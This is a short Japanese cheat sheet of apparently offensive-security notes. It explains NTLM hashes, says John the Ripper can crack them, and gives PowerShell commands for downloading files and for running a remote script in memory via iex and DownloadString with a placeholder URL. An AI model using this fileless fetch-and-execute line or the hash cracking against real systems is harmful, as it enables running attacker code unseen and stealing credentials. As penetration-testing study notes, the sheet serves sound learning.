## NTLMハッシュ
NTLMハッシュ（NT LAN Manager Hash）とは、Microsoft Windowsネットワーク環境で認証のために使用される、ユーザーのパスワードを不可逆的に変換したハッシュ値のこと。
johntheripperなどを使用することでクラックできることがある。
```bash
# 構造
ユーザー名:ホスト名またはドメイン:サーバーチャレンジ:クライアントレスポンス:クライアントチャレンジ/BLOB
```

## ファイルをダウンロード
```powershell
wget <URL> -o <ダウンロード先のパスと保存名>
iwr -URI <URL> -o <ダウンロード先のパスと保存名>
```

## ファイル自体はダウンロードせずメモリ上で実行
```powershell
iex (New-Object Net.WebClient).DownloadString('<URL>')
```
